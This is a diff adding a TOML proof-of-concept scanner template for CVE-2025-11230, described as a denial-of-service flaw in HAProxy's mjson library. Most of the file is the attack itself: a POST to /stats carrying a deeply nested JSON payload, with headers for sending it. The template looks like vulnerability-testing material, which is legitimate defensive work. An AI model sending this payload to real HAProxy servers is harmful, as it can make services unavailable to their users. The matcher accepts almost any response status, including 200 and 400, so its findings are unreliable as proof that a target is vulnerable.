@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "HAProxy mjson 库存在算法复杂度缺陷（CWE-407），远程攻击者可发送精心构造的 JSON 请求触发低效算法，导致目标服务拒绝服务。该漏洞影响使用受影响 mjson 版本的 HAProxy 部署，攻击无需身份认证，通过向 HAProxy 发送特制的 JSON 数据即可触发资源耗尽，造成服务不可用。"
+id = "POC-AVE-2025-0460"
+name = "CVE-2025-11230 PoC"
+severity = "high"
+tags = ["ave-2025-0460"]
+vuln_id = [
+    "CVE-2025-11230",
+    "AVE-2025-0460",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/stats"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":{"k":{"l":{"m":{"n":{"o":{"p":{"q":{"r":{"s":{"t":{"u":{"v":{"w":{"x":{"y":{"z":1}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    200,
+    400,
+    413,
+    500,
+    502,
+    503,
+]
+type = "status"
